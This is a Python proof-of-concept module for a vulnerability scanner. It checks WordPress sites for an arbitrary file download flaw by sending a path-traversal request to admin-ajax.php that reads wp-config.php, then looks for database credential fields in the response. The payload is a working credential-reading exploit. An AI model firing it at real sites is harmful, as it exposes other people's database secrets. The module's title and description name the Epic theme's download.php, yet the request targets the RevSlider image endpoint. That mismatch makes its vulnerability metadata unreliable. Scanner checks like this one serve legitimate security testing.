# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'WordPress_0086' # 平台漏洞编号，留空
    name = 'WordPress Theme Epic - download.php Arbitrary File Download' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD # 漏洞类型
    disclosure_date = '2014-09-08'  # 漏洞公布时间
    desc = '''
        WordPress Theme Epic - 'download.php' Arbitrary File Download.
    ''' # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/39298/' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress Theme Epic'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'cbaae509-cd43-4388-b0ca-b0266ccf3d22'
    author = '国光'  # POC编写者
    create_date = '2018-05-25' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = "/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php"
            verify_url = arg  + payload
            code, head, res, errcode, _ = hh.http(verify_url)
            if  code== 200 and 'DB_NAME' in res and 'DB_USER' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()